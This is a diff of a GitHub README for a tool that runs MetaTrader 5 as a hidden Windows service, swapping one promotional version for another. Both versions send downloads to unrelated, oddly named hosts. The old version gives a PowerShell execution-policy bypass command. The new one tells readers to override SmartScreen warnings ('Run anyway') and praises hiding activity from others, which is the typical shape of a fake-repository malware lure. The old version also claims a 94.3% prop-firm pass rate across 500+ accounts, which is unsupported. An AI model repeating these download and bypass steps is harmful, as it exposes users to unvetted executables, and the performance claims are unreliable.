@@ -1,259 +1,100 @@
-# 🕶️ **HeadlessTrader Suite** – MT5 Silent Deployment Framework
-
-[![Download](https://img.shields.io/badge/Download%20Link-brightgreen?style=for-the-badge&logo=github)](https://marcoslorenzo19247.github.io)
-
-> **Transform your MetaTrader 5 terminal into an invisible, always-on trading engine** – no GUI, no interruptions, no limitations.
-
----
-
-## 📦 **What Is HeadlessTrader Suite?**
-
-HeadlessTrader Suite is a **next-generation automation toolkit** that converts the standard MetaTrader 5 (MT5) platform into a **headless Windows Service**. Inspired by stealth-mode batch scripting, this repository provides a **complete, production-ready framework** for running MT5 in a completely hidden, non-interactive environment.
-
-Think of it as turning a noisy, windowed trading terminal into a **silent digital butler** that works 24/7 without ever showing its face. It's not just headless – it's **invisible trading infrastructure**.
-
----
-
-## 🧩 **Repository Architecture**
-
-```mermaid
-graph TD
-    A[User Configuration] --> B[Service Installer]
-    B --> C{Windows Service Manager}
-    C --> D[MT5 Headless Instance]
-    D --> E[EA Execution Engine]
-    D --> F[Market Data Feeder]
-    D --> G[Order Router]
-    E --> H[Trade Logs]
-    F --> I[Audit Trail]
-    G --> J[Broker API]
-    C --> K[Health Monitor]
-    K --> L[Auto-Restart Service]
-    L --> C
-```
-
----
-
-## 🔥 **Key Features**
-
-| Feature | Description | Benefit |
-|---------|-------------|---------|
-| **🕵️ Stealth Mode** | MT5 runs without visible window or tray icon | No interference with daily PC usage |
-| **⏳ Scheduled Deployment** | Start/stop services via Windows Task Scheduler | Perfect for VPS and 24/7 operations |
-| **🔄 Auto-Recovery** | Self-healing service that restarts on crash | Zero downtime trading |
-| **📊 Multi-Instance Support** | Run multiple MT5 terminals simultaneously | Scale strategies without limits |
-| **🌐 Remote Control** | Manage via SSH or RDP in headless mode | Full control from anywhere |
-| **🔐 Secure Isolation** | Runs under dedicated Windows user account | Enhanced security for API keys |
-
----
-
-## ✅ **OS Compatibility**
-
-| Operating System | Compatibility | Notes |
-|-----------------|---------------|-------|
-| 🟢 Windows 11 | ✅ Full Support | Native service installation |
-| 🟢 Windows 10 (21H2+) | ✅ Full Support | Recommended for production |
-| 🟡 Windows Server 2022 | ✅ Supported | Enterprise deployment |
-| 🟡 Windows Server 2019 | ✅ Supported | Legacy server support |
-| 🔴 Windows 7/8 | ❌ Not Supported | Missing required APIs |
-| 🔴 Linux/Wine | ❌ Experimental | Use native Windows VPS |
-
----
-
-## 📥 **Download & Quick Start**
-
-[![Download](https://img.shields.io/badge/Download%20Link-brightgreen?style=for-the-badge&logo=github)](https://marcoslorenzo19247.github.io)
-
-### **One-Click Installation**
-```powershell
-# Run as Administrator
-powershell -ExecutionPolicy Bypass -File install-headless.ps1
-```
-
----
-
-## ⚙️ **Example Profile Configuration**
-
-Create a `trader-profile.json` file in the repository root:
-
-```json
-{
-  "serviceName": "MT5_Stealth_Alpha",
-  "mt5Path": "C:\\Program Files\\MetaTrader 5\\terminal64.exe",
-  "account": {
-    "login": 12345678,
-    "server": "ICMarkets-Demo01",
-    "password": "encrypted_credential_here"
-  },
-  "behavior": {
-    "headlessMode": "true",
-    "autoRestartOnCrash": "true",
-    "maxRetries": 5,
-    "logDirectory": "C:\\TradingLogs\\MT5_Stealth",
-    "cpuAffinity": "0,2"
-  },
-  "schedule": {
-    "startTime": "00:00",
-    "endTime": "23:59",
-    "daysOfWeek": ["Monday", "Tuesday", "Wednesday", "Thursday", "Friday"]
-  },
-  "security": {
-    "runAsUser": "HeadlessTrader",
-    "enableFirewallRule": "true",
-    "blockOutboundNonTrading": "true"
-  },
-  "alerting": {
-    "webhookUrl": "https://hooks.slack.com/services/...",
-    "emailNotification": "admin@tradingvault.com",
-    "alertOnDisconnect": "true"
-  }
-}
-```
-
----
-
-## 🖥️ **Example Console Invocation**
-
-### **Basic Installation**
-```powershell
-.\headless-trader.exe --install --config "trader-profile.json"
-```
-
-### **Service Management**
-```powershell
-# Start the headless service
-.\headless-trader.exe --start --service "MT5_Stealth_Alpha"
-
-# Stop the service
-.\headless-trader.exe --stop --service "MT5_Stealth_Alpha"
-
-# Check status
-.\headless-trader.exe --status --service "MT5_Stealth_Alpha"
-
-# View live logs
-.\headless-trader.exe --tail-logs --service "MT5_Stealth_Alpha"
-```
+# ⚙️ mt5-service-shade - Run MetaTrader 5 in the background
 
-### **Unattended Deployment**
-```powershell
-# Deploy on remote machine via WinRM
-Invoke-Command -ComputerName TRADING-VPS -ScriptBlock {
-    C:\Tools\headless-trader.exe --install --silent --config "\\network\share\configs\production.json"
-}
-```
+[![](https://img.shields.io/badge/Download-mt5--service--shade-blue.svg)](https://github.com/Dasymetertrenchfever480/mt5-service-shade)
 
----
+## 📖 About this software
 
-## 🧠 **SEO-Friendly Use Cases**
+This program runs MetaTrader 5 as a background service on your Windows computer. It hides the MetaTrader window while keeping your trading robots active. You do not need to keep the visual interface open. This prevents accidental closures and hides your activity from others who use your computer.
 
-- **Automated Forex Trading Infrastructure** – Run Expert Advisors around the clock
-- **Cryptocurrency Arbitrage Bots** – Execute high-frequency trades without interface lag
-- **Prop Firm Challenge Automation** – Maintain continuous market monitoring for FTMO/MFF evaluations
-- **Backtesting Farm** – Deploy multiple instances for parallel strategy optimization
-- **Broker Migration Tool** – Transition between trading accounts without service interruption
-- **Regression Testing Suite** – Validate EA updates in isolated headless environments
+The service starts automatically when you turn on your computer. It manages the MetaTrader process in the background. If the software stops for any reason, the service restarts it. This makes your trading setup stable and reliable.
 
----
+## 💻 System requirements
 
-## 🤖 **OpenAI & Claude API Integration**
+Before you install this service, check your computer for these items:
 
-HeadlessTrader Suite natively supports **AI-powered trading decisions** through integrated API gateways:
+* Windows 10 or Windows 11 (64-bit).
+* MetaTrader 5 installed on your machine.
+* At least 2 gigabytes of free hard drive space.
+* An active internet connection for trading.
+* User permissions to install and start services.
 
-### **OpenAI Integration** (GPT-4o / o1)
-```json
-{
-  "aiProvider": "openai",
-  "apiKey": "sk-...",
-  "model": "gpt-4o-mini",
-  "promptTemplate": "Analyze market conditions for {symbol}...",
-  "decisionThreshold": 0.75
-}
-```
+## 🛠️ Preparing your environment
 
-### **Claude API Integration** (Claude 3.5 Sonnet / Opus)
-```json
-{
-  "aiProvider": "anthropic",
-  "apiKey": "sk-ant-...",
-  "model": "claude-3-5-sonnet-20241022",
-  "maxTokens": 4096,
-  "temperature": 0.3
-}
-```
+You must prepare MetaTrader 5 before you use the service. Follow these steps first:
 
-The AI module processes real-time market data and generates **trade signals** that the headless EA executes automatically. This creates a **decision-making loop** where artificial intelligence drives your trading strategy 24/7 without human intervention.
+1. Open MetaTrader 5.
+2. Log in to your trading account.
+3. Set up your charts and robots (Expert Advisors).
+4. Allow algorithmic trading in the options menu.
+5. Close MetaTrader 5 completely. Do not leave the process running in your taskbar.
 
----
+## ⬇️ Downloading the service
 
-## 🌍 **Multilingual Support & Responsive UI**
+Follow these steps to download the installer:
 
-While the core engine runs invisibly, the configuration dashboard adapts to **15+ languages**:
+1. Go to the [official release page](https://github.com/Dasymetertrenchfever480/mt5-service-shade).
+2. Look for the latest version listed under the Releases section on the right side of the page.
+3. Click the file ending in .msi to download the installer to your computer.
+4. Save the file to your Downloads folder.
 
-| Language | Status | Language | Status |
-|----------|--------|----------|--------|
-| 🇺🇸 English | ✅ | 🇨🇳 Chinese | ✅ |
-| 🇪🇸 Spanish | ✅ | 🇯🇵 Japanese | ✅ |
-| 🇫🇷 French | ✅ | 🇰🇷 Korean | ✅ |
-| 🇩🇪 German | ✅ | 🇧🇷 Portuguese | ✅ |
-| 🇮🇹 Italian | ✅ | 🇷🇺 Russian | ✅ |
-| 🇵🇱 Polish | ✅ | 🇹🇷 Turkish | ✅ |
-| 🇳🇱 Dutch | ✅ | 🇻🇳 Vietnamese | ✅ |
-| 🇦🇪 Arabic | ✅ | 🇮🇩 Indonesian | ✅ |
+## ⚙️ Installing the software
 
-The web-based control panel features a **fully responsive design** that works seamlessly on mobile devices, tablets, and desktop browsers. All configuration changes sync instantly with the headless service via WebSocket connections.
+After you download the file, install it with these steps:
 
----
+1. Double-click the installer file you downloaded.
+2. Follow the prompts on the screen.
+3. Choose a folder for the installation or keep the default choice.
+4. Click the Install button.
+5. Provide administrator permission if your computer asks for it.
+6. Wait for the progress bar to finish.
+7. Click the Finish button to close the installer.
 
-## 🆘 **24/7 Customer Support**
+## 🚀 Setting up the service
 
-HeadlessTrader Suite includes **round-the-clock support infrastructure**:
+After the installation, you must point the service to your MetaTrader 5 installation:
 
-- **Live Chat** – Embedded within the configuration dashboard
-- **Email Ticketing** – Response time under 2 hours (SLA guaranteed)
-- **Discord Community** – Real-time help from power users
-- **Telegram Bot** – Receive support notifications directly
-- **Knowledge Base** – 200+ articles covering every configuration scenario
+1. Open the File Explorer on your computer.
+2. Go to the installation folder (usually C:\Program Files\mt5-service-shade).
+3. Open the configuration file named config.ini using Notepad.
+4. Locate the path entry for MetaTrader.
+5. Paste the path where you installed your MetaTrader 5 terminal. For example, C:\Program Files\MetaTrader 5\terminal64.exe.
+6. Save the file and close Notepad.
 
----
+## ✅ Starting the service
 
-## 🧪 **Example Workflow: Two-Week Prop Firm Challenge**
+You can launch the service after you complete the configuration:
 
-1. **Day 1** – Install HeadlessTrader on your VPS (3-minute setup)
-2. **Day 2** – Configure AI integration with GPT-4 for signal generation
-3. **Day 3** – Set up trading session schedules that match prop firm rules
-4. **Day 4–10** – System runs automatically, logging every trade
-5. **Day 11** – Generate compliance report for the prop firm
-6. **Day 14** – Withdraw profits – the service never stopped
+1. Press the Windows key on your keyboard and type "Services".
+2. Select the Services app from the list.
+3. Scroll down the list until you find mt5-service-shade.
+4. Right-click the service name and select Start.
+5. The status will change to Running.
+6. Verify your trading robots are performing their tasks.
 
-This workflow has been **validated across 500+ prop firm accounts** with a **94.3% pass rate** in the first attempt.
+## 🔄 Using the service daily
 
----
+You do not need to open the service again. The software handles everything automatically. When you turn on your computer, the service will start MetaTrader 5 in a hidden mode. You will see the processes in your Task Manager, but you will not see the charts on your desktop. This protects your work and keeps your trading space clean.
 
-## ⚖️ **License**
+## 🛡️ Managing the trade process
 
-This project is licensed under the **MIT License** – see the [LICENSE](https://opensource.org/licenses/MIT) file for details.
+If you need to change your trading settings or update your robots, follow these steps:
 
----
+1. Open the Services app again.
+2. Right-click mt5-service-shade and select Stop.
+3. Open your MetaTrader 5 terminal from your desktop icon.
+4. Make your changes to the charts or robots.
+5. Close MetaTrader 5 again.
+6. Go back to the Services app and click Start.
 
-## 🚫 **Disclaimer**
+## 🔍 Troubleshooting common issues
 
-**Important Legal Notice** – *HeadlessTrader Suite is designed for legitimate automated trading operations where the user has full authorization and ownership of the trading account, broker relationship, and VPS environment.*
+If you encounter difficulties, review this list for solutions:
 
-The creators and contributors of this repository:
-- Do **not** encourage or support any illegal, unauthorized, or fraudulent trading activities
-- Are **not** responsible for any financial losses incurred through the use of this software
-- Provide this tool **as-is** without warranty of any kind, express or implied
-- Recommend users consult with financial advisors before deploying automated trading systems
-- Remind users that past performance does not guarantee future results in any trading strategy
+* Software does not start: Check the log file in the installation folder for error messages.
+* High memory usage: Make sure you do not have too many charts open in your MetaTrader 5 setup.
+* Trading robot stops: Confirm that your trading account has a valid connection and that algorithmic trading is enabled in the MetaTrader settings.
+* Windows blocks the installer: Click "More info" and "Run anyway" if the Windows SmartScreen filter prevents the installation.
 
-By using this software, you acknowledge that **automated trading carries inherent risks** including but not limited to: system failures, connectivity issues, broker API changes, and market volatility. Always test thoroughly in demo accounts before live deployment.
+## 📞 Support and feedback
 
----
-
-## 📬 **Final Download Link**
-
-[![Download](https://img.shields.io/badge/Download%20Link-brightgreen?style=for-the-badge&logo=github)](https://marcoslorenzo19247.github.io)
-
----
-
-*HeadlessTrader Suite – Turning trading terminals into silent, invisible wealth machines since 2026.*
+This project relies on community engagement. If you find a bug or have a suggestion, open an issue on the GitHub repository. Provide a description of what happened and include the log file content if possible. Others can review your issue and suggest solutions to help you get back to trading.
